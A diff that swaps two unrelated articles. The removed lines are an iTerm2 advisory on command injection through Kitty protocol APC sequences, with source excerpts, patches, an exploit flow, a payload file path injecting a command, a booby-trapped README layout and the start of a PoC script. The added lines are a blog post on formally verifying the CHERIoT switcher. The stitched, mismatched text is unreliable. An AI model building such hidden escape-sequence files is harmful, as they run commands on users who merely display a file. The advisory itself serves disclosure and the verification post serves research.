@@ -1,344 +1,283 @@
-iTerm2’s Kitty image protocol implementation has an arbitrary command execution vulnerability in the file transmit error response path. An APC escape sequence embedded in any file is consumed by the VT100 parser and does not appear in the `cat` output itself, but the Kitty file transmit error response preserves literal newlines from a crafted file path and writes them to PTY stdin — the shell interprets these newlines as command separators, resulting in arbitrary command execution.
+The [Cerise](https://cerise-project.org/) project<sup>[1](https://cheriot.org/verification/2026/11/24/griotte-verification-effort.html#fn:cerise)</sup> was started almost 10 years ago at Aarhus University.
+Its goal is to develop formal methods to verify properties of capability machines, in particular involving non-monotonicity,
+and to prove end-to-end results in the presence of unknown code.
+Cerise has been extended to model different aspects of capability machines,
+and has involved work by and collaborations with several other universities,
+including Dominique Devriese’s research group at KU Leuven,
+and the universities of Cambridge and Edinburgh.
 
-This is a **logic bug** — no memory corruption or race condition required — and is 100% reproducible. It works on a default iTerm2 installation with no configuration changes, and **triggers on all shells including bash, zsh, and fish**.
+Cerise started as pen-and-paper proofs about idealised machines and focused
+initially on reasoning about control-flow integrity of encapsulation for
+stack-based calling conventions, but over time our research group has scaled up
+the approach along three dimensions. First, we made our proofs foundational:
+Cerise now builds on the Iris separation logic framework inside the Rocq theorem
+prover, which has been critical to ensure correctness despite the growing
+intricacy of our proofs. Second, we have investigated how to reason about a
+wider range of properties, e.g., involving MMIO and attestation. Third, we made
+Cerise work with an instruction set closer to the CHERIoT Sail model, and
+verified programs using those instructions.
 
-## Affected Versions
+When I started my PhD, CHERIoT had just been announced.
+I seized the opportunity to apply the verification techniques of Cerise
+to the CHERIoT switcher, for example to check that it isolates compartments and enforces no-capture.
+To that end, we started a sub-project of Cerise, which we call Griotte<sup>[2](https://cheriot.org/verification/2026/11/24/griotte-verification-effort.html#fn:griotte)</sup>.
 
-| Affected | Fixed | Prerequisite |
-| --- | --- | --- |
-| 3.6.1 – 3.7.8 | 3.7.9 | iTerm2 installed (default settings) |
+As part of our verification effort in this Griotte project, we uncovered two
+bugs in the CHERIoT switcher: (1) the ability for a malicious (or buggy)
+scheduler to resuscitate an exited thread in a deprecated state, thereby getting
+access to a capability that it should not be able to have access to anymore, and
+(2) the ability for a malicious caller to leverage the stack high watermark
+register to trigger a fault in the switcher, thereby getting access to the
+callee’s stack frame and thus private data.
 
-## Vulnerability
+## Reasoning about unknown code
 
-Three independent issues combine into a single exploit chain: (1) the APC handler lacks the trust check present in OSC handlers, (2) the Kitty file transmit error path preserves literal newlines from `NSError.localizedDescription`, and (3) the response is unconditionally written to PTY stdin.
+The CHERI/CHERIoT threat model includes interactions with unknown compartments
+containing arbitrary code, which can be buggy or malicious, and which can share 
+objects in memory. Reasoning about arbitrary code is hard, because it
+requires characterising all the possible behaviours of that code. The challenge
+is that when trying to characterise what an unknown compartment can affect, we
+have to account not only for what it is passed directly (if an unknown
+compartment is physically passed a write capability to a region of memory, then
+it is behaviourally passed the ability to overwrite that region of memory), but
+also what it is passed indirectly—and this involves not only recursive
+access (if an unknown compartment is physically passed a read capability to a
+region of memory, then it is behaviourally passed the ability to acquire
+whatever ability is given by the capabilities in that region of memory), but
+also access through non-monotonic domain transitions (if an unknown compartment
+is physically passed a sealed entry point capability to a “counter”
+compartment’s `incr` function, then it is behaviourally passed the ability to
+affect the counter—but only by incrementing it). A unique feature of 
+Cerise is the ability to reason also about the latter part of the challenge.
 
-### APC Processing — No Trust Check
+What makes it difficult to design such a characterisation is that it should at
+the same time be precise enough, and simple enough to verify the programs that
+we care about. At a very high level, Griotte defines a language to succinctly
+describe what is affected—and to state that something is *not* affected. The
+kind of properties that we want to describe are not only memory safety
+properties (if I share a buffer to the caller, then I have the guarantee that it
+cannot access the global data that I never shared), but also no-capture
+properties (if I share a buffer to the caller with its global permission
+stripped, then I have the guarantee that it cannot preserve a copy across
+calls), and many others (including secrecy, etc.).
 
-When the VT100 parser receives an APC sequence, it calls `executeAPC:`. At [A], it checks for tmux mode — if active, it returns early. At [B], it checks only whether the string starts with “G”, and at [C] creates a Kitty image command and passes it to the delegate. Compared to OSC sequence handling, the `terminalIsTrusted` check is **completely absent**. Any APC that reaches the VT100 parser is unconditionally executed regardless of source.
+## Separation logic and logical relations
 
-```
-// sources/VT100/VT100Terminal.m — executeAPC:
+Technically, we developed a reasoning system in two parts.
+First, we defined (and proved sound) a separation logic that allows us to verify known code line by line,
+showing that it satisfies expected pre- and post-conditions,
+and that it preserves the expected invariants.
+We used this both on the code of the switcher,
+and on the code of specific compartments of interest, for example a key-value store<sup>[3](https://cheriot.org/verification/2026/11/24/griotte-verification-effort.html#fn:kvs)</sup>.
+We designed this separation logic so it is reusable,
+and we expect that other such compartments of interest could be verified with it.
 
-- (void)executeAPC:(VT100Token *)token {
-    if (_tmuxMode) {                                                // [A]
-        [_delegate terminalSetWindowTitle:...];
-        return;
-    }
-    if ([token.string hasPrefix:@"G"]) {                            // [B]
-        iTermKittyImageCommand *command =
-            [[iTermKittyImageCommand alloc]
-                initWithAPCString:[token.string substringFromIndex:1]];
-        if (!command) {
-            return;
-        }
-        [_delegate terminalDidReceiveKittyImageCommand:command];    // [C]
-    }
-}
-```
+Second, we defined a logical relation in separation logic,
+which is effectively an over-approximation of the effect of unknown code
+that can be used by the separation logic
+to reason about a jump to unknown code (through the switcher) in one single step.
+As such, it works like a universal contract<sup>[4](https://cheriot.org/verification/2026/11/24/griotte-verification-effort.html#fn:contract)</sup> for CHERIoT.
+Crucially, the frame rule of separation logic
+tells us that if we can establish that the resources (both in an informal sense, and in the technical sense of separation logic) of the caller
+are disjoint from those of the logical relation,
+then they will be preserved by the call.
 
-No trust check exists in the delegate chain either. At [A], the command is passed directly to `kittyImageController`.
+For example, if calling unknown code with a capability to a shared buffer,
+while keeping some private data,
+the logical relation requires that the unknown code is only passed capabilities that are *safe to share*
+in a technical sense.
 
-```
-// sources/VT100Screen/VT100ScreenMutableState+TerminalDelegate.m
+We then define a universal contract, stating that if an adversary has only access to
+*safe to share* capabilities, it can then execute safely and only produce other *safe to share* capabilities.
 
-- (void)terminalDidReceiveKittyImageCommand:(iTermKittyImageCommand *)command {
-    [_kittyImageController execute:command];                        // [A]
-}
-```
+## Verification in the presence of compartments and a trusted switcher
 
-### Kitty File Transmit — Error Newline Preservation
+We started by developing a simplified model of CHERIoT
+and a mini version of the CHERIoT-RTOS.
+In particular, we modelled the compartmentalisation mechanisms and 
+the cross-compartment call path of the switcher. 
+Our simplified model mirrors the main features of the CHERIoT hardware (including the new deep
+locality and deep immutability permissions).
+While our mini switcher doesn’t follow CHERIoT’s switcher instruction-by-instruction, 
+it implements the same steps.
 
-When the Kitty image controller receives a `t=f` (file transmit) command, it decodes the base64 payload and uses it as a file path. At [A], `URL.resourceValues()` checks whether the file exists — if it doesn’t, an exception is thrown. At [B], the `filenameIsSafe()` blocklist check exists, but this code is only reachable after `resourceValues()` succeeds, so it **never executes for non-existent files**. At [C], the catch block embeds `error.localizedDescription` directly into the error message. macOS’s `NSError.localizedDescription` preserves **literal newlines (0x0A)** in filenames without escaping them.
+In this model, we proved on a range of small examples that 
+the CHERIoT hardware-software co-design
+implements the expected memory-safety properties,
+and that the switcher’s *overall design* enforces both compartmentalisation and stack safety.
 
-```
-// sources/InlineImages/KittyImageController.swift — handle(command:fileURL:query:)
+Our “end-to-end” results about concrete examples
+assume that the machine starts in a state that corresponds
+to the firmware image having been properly loaded.
+We have not verified the loader itself, and so it is part of our TCB.
+Technically, we consider executions only starting from a “loader-final” state.
+The loader is deterministic and so it is relatively easy to dump the contents of memory from a
+device (or simulator) after the loader has run and verify that a specific execution of the loader meets the
+properties required by our “loader-final” state.
 
-private func handle(command: KittyImageCommand.ImageTransmission,
-                    fileURL: URL,
-                    query: Bool) -> String? {
-    do {
-        let values = try fileURL.resourceValues(forKeys: [.isRegularFileKey])  // [A]
-        guard values.isRegularFile == true else {
-            return "EBADF:Not a file"
-        }
-        guard filenameIsSafe(fileURL: fileURL) else {                           // [B]
-            return "EBADF:Invalid path"
-        }
-        let content = try Data(contentsOf: fileURL)
-        return handle(command: command, data: content, query: query)
-    } catch {
-        return "EBADF:\(error.localizedDescription)"                            // [C]
-    }
-}
-```
+We expect that it should be possible to prove the loader correct,
+but this is future work for now.
 
-### Response Written to PTY Stdin
+## The cherry on top: Concurrency, exception handling and optimisations
 
-The response containing the error message is written to PTY stdin. At [A], the default verbosity `.normal` **always** sends the response — it is sent regardless of whether it is an error. At [B], the response is wrapped in APC format (`ESC_G...ESC\`) and passed to the delegate.
+Our initial model was a simplification of CHERIoT:
+it didn’t support exceptions or concurrency/context switching,
+and some optimisations of the switcher (such as the stack high watermark)
+were left out.
 
-```
-// sources/InlineImages/KittyImageController.swift — respondToTransmit()
+The CHERIoT team has been dedicated to making CHERIoT trustworthy,
+and has been very supportive of our verification effort.
+To that end, they included, in the switcher’s source, detailed comments about the expected 
+invariants and behaviour of the switcher, in the form of pre- and post-conditions
+for the execution blocks.
+They pointed out that the complicated control flow in the switcher’s exception path 
+was a likely source of errors.
 
-func respondToTransmit(_ imageTransmission: KittyImageCommand.ImageTransmission,
-                        display: KittyImageCommand.ImageDisplay?,
-                        error: String?) {
-    if imageTransmission.more == .expectMore {
-        return
-    }
-    var args = [String]()
-    args.append("i=\(imageTransmission.identifier)")
-    // ...
-    let payload = args.joined(separator: ",") + semi + (error ?? "OK")
-    let message = "\u{1B}_G\(payload)\u{1B}\\"
+Our efforts showed that the cross-compartments call (and return) path that we verified 
+was straightforward
+(although stating no-capture and stack safety at the separation logic level is not trivial!),
+but a good starting point.
+However, as pointed out by the CHERIoT team,
+the features that we initially left out are more prone to mistakes:
+the switcher’s exception handler (responsible for context switching and error handling)
+has a more fiddly and convoluted execution path,
+and the stack high watermark creates a new point of trust.
 
-    switch imageTransmission.verbosity {
-    case .normal:                                                               // [A]
-        delegate?.kittyImageControllerReport(message: message)                  // [B]
-    case .query:
-        if error != nil {
-            delegate?.kittyImageControllerReport(message: message)
-        }
-        return
-    case .quiet:
-        return
-    }
-}
-```
+By pursuing our verification effort to include the features missing from our initial model,
+some of the examples that we proved in the simplified setup
+did not work anymore, which actually uncovered bugs in the switcher.
 
-At the end of the delegate chain, [A] the response data is written to the PTY via `screenSendReportData:`. This function sends data through the same path as keyboard input, so the shell interprets this data as if the user typed it.
+### “High is too low”: Stack high watermark and exception handler
 
-```
-// sources/VT100Screen/VT100ScreenMutableState.m — kittyImageControllerReportWithMessage:
+The first bug that we uncovered comes from an interaction between the exception handler
+and the stack high watermark.
 
-- (void)kittyImageControllerReportWithMessage:(NSString *)string {
-    [self willSendReport];
-    __weak __typeof(self) weakSelf = self;
-    const NSStringEncoding encoding = self.terminal.encoding;
-    [self addSideEffect:^(id<VT100ScreenDelegate> delegate) {
-        [delegate screenSendReportData:                                         // [A]
-            [string dataUsingEncoding:encoding]];
-        [weakSelf didSendReport:delegate];
-    } name:@"kitty image report"];
-}
-```
+In the presence of an exception handler,
+any instruction must either ensure that it cannot fault,
+or that the exception handler can safely execute (either by force-unwinding to the caller, or by
+giving control to the error handler of the faulting compartment).
+In our proof, this manifests as each instruction coming with a proof obligation
+that even when the instruction can fault, all invariants of the system are maintained.
 
-### Bypassed Security Controls
+On the other hand, the stack high watermark (SHWM) is an optimisation allowing the switcher
+to clear only the stack frame used during the call.
+Specifically, the SHWM tracks, in hardware, the highest address of the stack that has been written to,
+and the switcher only clears up to this address, instead of the whole shared stack region.
+The code of the switcher relied on an invariant for the SHWM:
+it should always be in between the bounds of the stack capability at the point of a cross-compartment call.
+To that end, the switcher always re-sets it in the bounds of the stack capability at
+cross-compartment calls and returns.
+This invariant was very dynamic by nature,
+because the bounds of the stack change in between cross-compartment calls.
 
-| Security control | Status | Reason |
-| --- | --- | --- |
-| `filenameIsSafe()` | Bypassed | Located after `resourceValues()` throw — unreachable for non-existent files |
-| `terminalIsTrusted` | Absent | No trust check in `executeAPC:` (unlike OSC) |
-| `disablePotentiallyInsecureEscapeSequences` | Not applicable | Does not cover APC sequences |
-| Default verbosity | Favors attacker | `.normal` is the default — error response is always sent |
+However, it turns out that this invariant did not hold:
+a malicious caller could craft a stack pointer with restricted bounds, 
+together with a stack object outside of this restricted stack to be used 
+later by a callee.
+This scenario can lead to a fault in the switcher return path of the callee,
+before it has cleared the callee stack frame,
+which then allows a malicious caller to recover the entire callee’s private state.
 
-### Patch
+We identified this problem when we tried to adapt our proof
+from a simplified switcher (without the SHWM),
+to a more faithful switcher (with the SHWM).
+The proof got stuck when we had to show that an adversary
+could not move the SHWM outside of the bounds of the stack.
+After a bit of investigation, we realised that it was not because we had failed to correctly capture the informal invariant,
+but because that invariant was not preserved.
+More specifically, it seemed to be possible for an attacker to move SHWM below the base of the stack capability.
 
-The developer confirmed and fixed the vulnerability across two commits. Adding a `terminalIsTrusted` check to the APC handler would **not** have protected default installations — `terminalIsTrusted` is simply the inverse of the advanced setting “Disable potentially insecure escape sequences,” which is **off by default** (the terminal is trusted by default). The response sanitization is what closes the hole for everyone.
+We first tried to relax this (expected) invariant and allow SHWM to move below the base of the stack capability,
+but this condition was guarding a fault in the cross-compartment return-path.
+With the relaxed invariant, we had to prove that the fault was safe,
+which turned out to be impossible to prove, due to the callee’s stack frame being preserved.
+That’s how we realised that it was possible to mount an attack,
+with a subtle construction to move the SHWM below the base of the stack capability
+and exploiting the fault in the switcher’s return path to recover the uncleared callee’s stack frame.
 
-The first fix adds `sanitizedResponseMessage(_:)` to `KittyImageController.swift`. It replaces every C0 control character (0x00–0x1F, including ESC, CR, LF) and DEL (0x7F) with a space before the response is framed and sent. The error payload in `respondToTransmit()` and `respondToDisplay()` is passed through this sanitizer.
-[a53b1bc](https://github.com/gnachman/iTerm2/commit/a53b1bc084fe062de44b52d03ccf713c7962ac83)
+The fix (merged in [PR #799](https://github.com/CHERIoT-Platform/cheriot-rtos/pull/799))
+ended up being pretty simple:
+by forbidding malicious callers from changing the base of the stack,
+it ensures that malicious callers cannot craft a stack object outside of the stack that would
+move the SHWM outside of the stack bounds.
+This does not prevent the caller from calling the callee with less than the maximum possible
+amount of stack space,
+but does require that the shared stack region is truncated in the same direction as normal stack allocation.
 
-```
-diff --git a/sources/InlineImages/KittyImageController.swift b/sources/InlineImages/KittyImageController.swift
---- a/sources/InlineImages/KittyImageController.swift
-+++ b/sources/InlineImages/KittyImageController.swift
-@@ -987,6 +987,28 @@ class KittyImageController: NSObject {
+We could validate the fix in our setup, by completing the proof, before the merge.
 
-         return data
-     }
-+    private static func sanitizedResponseMessage(_ string: String) -> String {
-+        var result = ""
-+        result.unicodeScalars.reserveCapacity(string.unicodeScalars.count)
-+        for scalar in string.unicodeScalars {
-+            if scalar.value < 0x20 || scalar.value == 0x7f {
-+                result.unicodeScalars.append(" ")
-+            } else {
-+                result.unicodeScalars.append(scalar)
-+            }
-+        }
-+        return result
-+    }
-+
-     func respondToTransmit(_ imageTransmission: KittyImageCommand.ImageTransmission,
-                             display: KittyImageCommand.ImageDisplay?,
-                             error: String?) {
-@@ -1005,7 +1027,7 @@ class KittyImageController: NSObject {
-             args.append("p=\(p)")
-         }
-         let semi = args.isEmpty ? "" : ";"
--        let payload = args.joined(separator: ",") + semi + (error ?? "OK")
-+        let payload = args.joined(separator: ",") + semi + (error.map { Self.sanitizedResponseMessage($0) } ?? "OK")
-         let message = "\u{1B}_G\(payload)\u{1B}\\"
+### “You’re not really over yet”: Concurrency with a malicious scheduler
 
-         switch imageTransmission.verbosity {
-@@ -1241,7 +1263,7 @@ class KittyImageController: NSObject {
-         }()
-         let pre = "\u{1B}_G"
-         let post = "\u{1B}\\"
--        let errorOrOK = error ?? "OK"
-+        let errorOrOK = error.map { Self.sanitizedResponseMessage($0) } ?? "OK"
-         let message =
-             if parameters.isEmpty {
-                 errorOrOK
-```
+While verifying the context switching path in our simplified switcher,
+and in particular the path that an exited thread takes,
+we needed to define “what it means for a thread to exit”,
+and what is the authority that an exited thread still holds.
+We first looked at the scheduler’s code, in which exited threads are never meant to be scheduled anymore.
+Intuitively, we would think that an exited thread has no continuation.
 
-The follow-up commit extracts a shared sanitizer `stringByReplacingControlCharactersWithSpace` on `NSString`, extending coverage to C1 characters (0x80–0x9F) while preserving Unicode format characters (Cf) such as ZWJ and bidi marks. It replaces the per-file sanitizer and is applied to three report paths: Kitty image, Kitty drag-and-drop (OSC 72), and title reporting.
-[2a63835](https://github.com/gnachman/iTerm2/commit/2a63835ca19bbd20b0d051b33c14341b0b708d5b)
+However, the scheduler is not trusted for confidentiality or integrity 
+(which are the properties we are verifying!), which means that in our model,
+we consider the scheduler as any other adversary compartment
+(and therefore, from our perspective, it contains arbitrary code).
+In particular, a malicious (or buggy) scheduler could schedule an exited thread,
+in which case the switcher re-instated that thread’s last context (as stored in the context switching save area),
+independently from whether that thread had exited.
+Because the thread exit path of the switcher never cleared the save area,
+an exited thread’s last context turned out to be whatever was left after the last preemption (or fault), 
+which means that it could contain local capabilities that should not have been captured—clearly violating no-capture.
 
-```
-diff --git a/sources/Categories/NSStringITerm.m b/sources/Categories/NSStringITerm.m
---- a/sources/Categories/NSStringITerm.m
-+++ b/sources/Categories/NSStringITerm.m
-@@ -1757,6 +1757,42 @@
-     }];
- }
+We caught this bug because our formal verification method—focused on integrity and confidentiality—captures the threat model of CHERIoT,
+where the scheduler is no different from other adversaries with respect to those properties.
+The way the problem manifested in our proof is that we had to define what the authority of the continuation of an exited thread is,
+to account for what would happen if the thread were scheduled in a stale state.
+However, this looked fishy, and so we started questioning whether we should even have to consider such a situation.
 
-++ (NSCharacterSet *)it_reportUnsafeControlCharacterSet {
-+    static NSCharacterSet *set;
-+    static dispatch_once_t onceToken;
-+    dispatch_once(&onceToken, ^{
-+        NSMutableCharacterSet *mutableSet = [NSMutableCharacterSet characterSetWithRange:NSMakeRange(0, 0x20)];
-+        [mutableSet addCharactersInRange:NSMakeRange(0x7F, 0x21)];
-+        set = [mutableSet copy];
-+    });
-+    return set;
-+}
-+
-+- (NSString *)stringByReplacingControlCharactersWithSpace {
-+    const NSUInteger length = self.length;
-+    if ([self rangeOfCharacterFromSet:[NSString it_reportUnsafeControlCharacterSet]].location == NSNotFound) {
-+        return self;
-+    }
-+    unichar *buffer = malloc(sizeof(unichar) * length);
-+    [self getCharacters:buffer range:NSMakeRange(0, length)];
-+    for (NSUInteger i = 0; i < length; i++) {
-+        if (iTermIsReportUnsafeControlCharacter(buffer[i])) {
-+            buffer[i] = ' ';
-+        }
-+    }
-+    return [[NSString alloc] initWithCharactersNoCopy:buffer length:length freeWhenDone:YES];
-+}
-```
+There are two disjoint sub-problems:
+(1) having access to an old register file (potentially breaking no-capture guarantees),
+and (2) an exited thread being re-scheduled.
+Sub-problem (1) is dangerous for integrity and confidentiality.
+Sub-problem (2) is a design question—what should happen if the scheduler reschedules an exited thread.
 
-The Kitty drag-and-drop sanitizer was changed from stripping only CR/LF to stripping all control characters, and the title report sanitizer was hardened the same way.
+The fix (merged in [PR #769](https://github.com/CHERIoT-Platform/cheriot-rtos/pull/769))
+then fixed those problems:
+(1) the register file is cleared in the exit thread path (preventing an exited thread from using stale values)
+and (2) an exited thread becomes an idle thread looping in a `wfi` (wait-for-interrupt) loop.
+This fix was one of several possible fixes considered but was chosen because the scheduler always has the ability to run the idle thread (which loops in a `wfi` instruction).
+This meant that the ability to schedule an exited thread could be trivially shown to not increase the power of the scheduler.
 
-```
-diff --git a/sources/DragAndDrop/KittyDnDMessage.swift b/sources/DragAndDrop/KittyDnDMessage.swift
---- a/sources/DragAndDrop/KittyDnDMessage.swift
-+++ b/sources/DragAndDrop/KittyDnDMessage.swift
-@@ -62,13 +66,12 @@
-         return parts.joined(separator: ":")
-     }
+## What now?
 
-     static func sanitize(_ value: String) -> String {
--        guard value.utf8.contains(where: { $0 == 0x0a || $0 == 0x0d }) else {
--            return value
--        }
--        return String(value.unicodeScalars.filter { $0 != "\n" && $0 != "\r" })
-+        return (value as NSString).replacingControlCharactersWithSpace()
-     }
+With the fixed bugs, we have verified our Griotte switcher on top of our Griotte ISA,
+assuming that the loader initialises the machine properly.
 
-diff --git a/sources/PTYSession/PTYSession.m b/sources/PTYSession/PTYSession.m
---- a/sources/PTYSession/PTYSession.m
-+++ b/sources/PTYSession/PTYSession.m
-@@ -19925,7 +19925,13 @@
- - (NSString *)reportSafeTitle:(NSString *)unsafeTitle {
--    NSCharacterSet *unsafeSet = [NSCharacterSet characterSetWithCharactersInString:@"|;\r\n\e"];
-+    NSMutableCharacterSet *unsafeSet = [[NSString it_reportUnsafeControlCharacterSet] mutableCopy];
-+    [unsafeSet addCharactersInString:@"|;"];
-     NSString *result = unsafeTitle;
-     NSRange range;
-     range = [result rangeOfCharacterFromSet:unsafeSet];
-```
+That gave us confidence to scale our verification to be based on
+the whole authoritative [cheriot-sail](https://github.com/CHERIoT-Platform/cheriot-sail) ISA, 
+using the `sail-to-rocq` extraction, and our proofs of that are now complete.
+It means that we are quite confident that 
+the [current upstream](https://github.com/CHERIoT-Platform/cheriot-rtos/blob/e2dad05078bd25ed6f1ab993e14f332aa8c20557/sdk/core/switcher/entry.S) 
+switcher, together with the hardware, implement thread and compartments isolation, as well as no-capture.
 
-## Exploitation
+In the future we would also like to verify the loader, and we also hope that our
+logical machinery can be used to verify correctness and security of applications
+running atop CHERIoT.
 
-The attack vector is embedding APC escape sequence bytes into a malicious file. When the entire file content is output to the terminal (e.g., via `cat`), the raw bytes are delivered to the terminal and processed by the VT100 parser. **This works on all shells — bash, zsh, fish, etc.** — the shell type is irrelevant.
+## Other formal verification work you might be interested in
 
-The APC sequence (starting with `ESC _`, ending with `ESC \`) is consumed by iTerm2’s VT100 parser and is **invisible in the `cat` output** — the file appears to be a normal document. However, when the exploit triggers, the error response injected into PTY stdin produces visible garbled shell errors on the terminal. The injected command executes between these garbled lines, so the command execution itself is visible to the user. Concealment of this output was not explored in this research.
+The focus of Cerise and Griotte has been *advanced* properties of capability machines,
+in particular involving non-monotonic domain transitions.
+As such, it is complementary to other formal verification work:
 
-### Injection Detail
+- Nienhuis et al. [2] and Bauereiß et al. [3] prove capability monotonicity of real ISAs for CHERI-MIPS and Morello, respectively; and Hammond et al. [4] builds on top of those proofs and Cerise to recover some non-monotonic domain transitions
+- Ploix et al. [5] proves that the CHERIoT-Ibex implements the CHERIoT-Sail model
+- Duque Antón et al. [6] and Rosemeyer [7] prove security properties at the level of the RTL
+- Work on an abstract specification of the CHERIoT ISA and switcher at Google.
 
-The core of the attack relies on two facts: macOS `NSError.localizedDescription` **preserves literal newlines in filenames**, and the error message uses **curly quotes instead of ASCII double-quotes**.
+## References
 
-**Why ASCII double-quotes are not used**: If ASCII `"` is included in the file path, it appears as-is in the error message. When delivered to the shell via PTY, bash enters double-quote mode upon encountering `"`, and newlines no longer act as command separators. macOS’s `NSError.localizedDescription` uses Unicode curly quotes (`“`, `”`), which are not special characters in bash and do not trigger quote mode.
-
-The file path set by the attacker (before base64 encoding):
-
-```
-/tmp/x\nopen -a Calculator\nz
-       ^^^^^^^^^^^^^^^^^^^^
-       injected command (between newlines)
-```
-
-### Exploit Flow
-
-```
-1. Attacker: Build exploit file
-   └── Any file (README.md, .txt, .log, etc.) with hidden APC bytes
-
-2. Delivery: Git repository, shared folder, archive, email attachment
-
-3. Victim: cat <file>
-
-4. iTerm2 processing:
-   ├── Normal text output (visible)
-   ├── APC bytes → VT100 Parser (invisible, consumed)
-   │   └── executeAPC:                              ← NO trust check
-   │       └── KittyImageController.execute()
-   │           └── executeTransmitFile()
-   │               └── base64 decode → file path with \n
-   │
-   ├── handle(command:fileURL:query:)
-   │   └── resourceValues() throws                   ← file not found
-   │       └── catch: "EBADF:\(error.localizedDescription)"
-   │           └── localizedDescription preserves \n ← NEWLINES PRESERVED
-   │
-   ├── respondToTransmit()
-   │   └── verbosity .normal → ALWAYS sends          ← no suppression
-   │       └── kittyImageControllerReport()
-   │           └── screenSendReportData()             ← WRITES TO PTY STDIN
-   │
-   └── Shell reads PTY stdin
-       └── Line discipline splits on \n:
-           Line 1: \x1b_Gi=1;EBADF:The file “/tmp/x  ← garbled (shell error)
-           Line 2: open -a Calculator               ← EXECUTED
-           Line 3: z” couldn’t be opened...         ← shell error (ignored)
-
-5. Result: Calculator.app launches
-```
-
-### Exploit File Structure
-
-APC bytes can be embedded in any file type — `.md`, `.txt`, `.log`, `.csv`, configuration files, source code, etc. The only requirement is that the file content is output to the terminal via `cat`. The following example uses a README.md, but any file that a user might `cat` is a valid vector. The APC itself is invisible in `cat` output (consumed by the VT100 parser), but the error response injected into PTY stdin appears as garbled shell errors alongside the executed command.
-
-```
-README.md (243 bytes)
-├── # Project Setup Guide
-├── ## Prerequisites
-│     └── normal markdown text
-├── [APC bytes]                    ← invisible in cat output
-│     └── \x1b_Ga=T,f=100,t=f,i=1;<payload_base64>\x1b\
-├── ## Installation
-│     └── normal markdown text
-└── ## License
-```
-
-## PoC
-
-### Full Exploit
-
-```
-#!/usr/bin/env python3
-"""
-iTerm2 Kitty — cat trigger PoC
-====================================
-Creates a README.md with an embedded APC escape sequence.
-When displayed with cat in iTerm2, the Kitty image
-protocol error response injects a command into PTY stdin.
-
-CRITICAL: Command must NOT contain '/' characters.
-  '/' is a path separator in URL(fileURLWithPath:), which
-  splits the path and changes the error message format,
-  breaking the newline injection.
-"""
+1. Sander Huyghebaert, Steven Keuchel, Coen De Roover and Dominique Devriese. [Formalizing, Verifying and Applying ISA Security Guarantees as Universal Contracts](http://doi.org/10.1145/3576915.3616602). *Proceedings of the 2023 ACM SIGSAC Conference on Computer and Communications Security*, Association for Computing Machinery (2023), 2083–2097. [doi] BibTeX @inproceedings{huyghebaert2023, author = {Huyghebaert, Sander and Keuchel, Steven and De Roover, Coen and Devriese, Dominique}, title = {Formalizing, Verifying and Applying ISA Security Guarantees as Universal Contracts}, booktitle = {Proceedings of the 2023 ACM SIGSAC Conference on Computer and Communications Security}, series = {CCS '23}, publisher = {Association for Computing Machinery}, year = {2023}, month = nov, pages = {2083--2097}, doi = {10.1145/3576915.3616602} }
+2. Kyndylan Nienhuis, Alexandre Joannou, Thomas Bauereiss, Anthony Fox, Michael Roe, Brian Campbell, Matthew Naylor, Robert M. Norton, Simon W. Moore, Peter G. Neumann, Ian Stark, Robert N. M. Watson and Peter Sewell. [Rigorous engineering for hardware security: Formal modelling and proof in the CHERI design and implementation process](http://doi.org/10.1109/SP40000.2020.00055). *2020 IEEE Symposium on Security and Privacy (SP)*, IEEE (2020), 1003–1020. [doi] BibTeX @inproceedings{nienhuis2020, author = {Nienhuis, Kyndylan and Joannou, Alexandre and Bauereiss, Thomas and Fox, Anthony and Roe, Michael and Campbell, Brian and Naylor, Matthew and Norton, Robert M. and Moore, Simon W. and Neumann, Peter G. and Stark, Ian and Watson, Robert N. M. and Sewell, Peter}, title = {Rigorous engineering for hardware security: Formal modelling and proof in the CHERI design and implementation process}, booktitle = {2020 IEEE Symposium on Security and Privacy (SP)}, publisher = {IEEE}, year = {2020}, month = may, pages = {1003--1020}, doi = {10.1109/SP40000.2020.00055} }
+3. Thomas Bauereiss, Brian Campbell, Thomas Sewell, Alasdair Armstrong, Lawrence Esswood, Ian Stark, Graeme Barnes, Robert N. M. Watson and Peter Sewell. [Verified Security for the Morello Capability-enhanced Prototype Arm Architecture](http://doi.org/10.1007/978-3-030-99336-8_7). *Programming Languages and Systems (ESOP 2022)*, Springer International Publishing (2022), 174–203. [doi] BibTeX @inproceedings{bauereiss2022, author = {Bauereiss, Thomas and Campbell, Brian and Sewell, Thomas and Armstrong, Alasdair and Esswood, Lawrence and Stark, Ian and Barnes, Graeme and Watson, Robert N. M. and Sewell, Peter}, title = {Verified Security for the Morello Capability-enhanced Prototype Arm Architecture}, booktitle = {Programming Languages and Systems (ESOP 2022)}, series = {Lecture Notes in Computer Science}, publisher = {Springer International Publishing}, year = {2022}, pages = {174--203}, isbn = {9783030993368}, doi = {10.1007/978-3-030-99336-8_7} }
+4. Angus Hammond, Ricardo Almeida, Thomas Bauereiss, Brian Campbell, Ian Stark and Peter Sewell. [Morello-Cerise: A Proof of Strong Encapsulation for the Arm Morello Capability Hardware Architecture](https://dl.acm.org/doi/pdf/10.1145/3729329). *Proceedings of the ACM on Programming Languages 9*, PLDI (2025), 1961–1983. [pdf] [doi] BibTeX @article{hammond2025, author = {Hammond, Angus and Almeida, Ricardo and Bauereiss, Thomas and Campbell, Brian and Stark, Ian and Sewell, Peter}, title = {Morello-Cerise: A Proof of Strong Encapsulation for the Arm Morello Capability Hardware Architecture}, journal = {Proceedings of the ACM on Programming Languages}, volume = {9}, number = {PLDI}, publisher = {Association for Computing Machinery}, year = {2025}, month = jun, pages = {1961--1983}, issn = {2475-1421}, doi = {10.1145/3729329}, pdf = {https://dl.acm.org/doi/pdf/10.1145/3729329} }
+5. Louis-Emile Ploix, Alasdair Armstrong, Tom Melham, Ray Lin, Haolong Wang and Anastasia Courtney. [Comprehensive Formal Verification of Observational Correctness for the CHERIoT-Ibex Processor](https://arxiv.org/abs/2502.04738). 2025. [doi] BibTeX @misc{ploix2025, author = {Ploix, Louis-Emile and Armstrong, Alasdair and Melham, Tom and Lin, Ray and Wang, Haolong and Courtney, Anastasia}, title = {Comprehensive Formal Verification of Observational Correctness for the CHERIoT-Ibex Processor}, publisher = {arXiv}, year = {2025}, doi = {10.48550/arXiv.2502.04738}, url = {https://arxiv.org/abs/2502.04738} }
